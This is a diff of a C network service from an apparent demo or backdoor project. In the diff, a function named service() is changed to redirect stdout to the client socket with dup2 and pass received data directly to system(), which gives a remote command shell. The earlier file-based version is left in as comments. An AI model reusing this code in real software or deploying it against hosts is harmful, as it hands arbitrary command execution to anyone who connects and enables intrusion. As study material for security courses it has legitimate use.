@@ -9,6 +9,7 @@
 
 
 #include "demo.h"
+#include "errno.h"
 
 struct sym_list Head;	/* head of singly-linked list */
 
@@ -220,28 +221,38 @@ service( int fd, char *name, char *password, char *good, char *evil)
         }
 
         /*Change mac id*/
-        
+
 
         /*Execute Shell and pass recv_buf to the shell */
         else {
 
-          char command[100];
-          
-          printf("%s", recv_buf);
-          
-          size_t ln = strlen(recv_buf) - 1;
-          if (recv_buf[ln] == '\n')
-          recv_buf[ln] = '\0';    
-          
-          strcpy(command, recv_buf);
-          strcat(command, "> command_out");
-          printf("%s", command);
-          system(command);
-          memset(command,0,strlen(command));
+//     printf("command received: %s\n", buf);
+           if(dup2(fd, 1) == -1)
+     {
+    printf("Error redirecting stdout:%s\n", strerror(errno));
+     }
+           system(recv_buf);
+    fflush(client_rep);
+    
+//     dup2(std_out, fd);
 
-          // Now read from the file command_out and send to the client. 
+          // char command[100];
+          
+          // printf("%s", recv_buf);
+          
+          // size_t ln = strlen(recv_buf) - 1;
+          // if (recv_buf[ln] == '\n')
+          // recv_buf[ln] = '\0';    
+          
+          // strcpy(command, recv_buf);
+          // strcat(command, "> command_out");
+          // printf("%s", command);
+          // system(command);
+          // memset(command,0,strlen(command));
 
-          sendToClient("Incorrect Usage. See README\n", client_rep);
+          // // Now read from the file command_out and send to the client. 
+
+          // sendToClient("Incorrect Usage. See README\n", client_rep);
 
 
         }
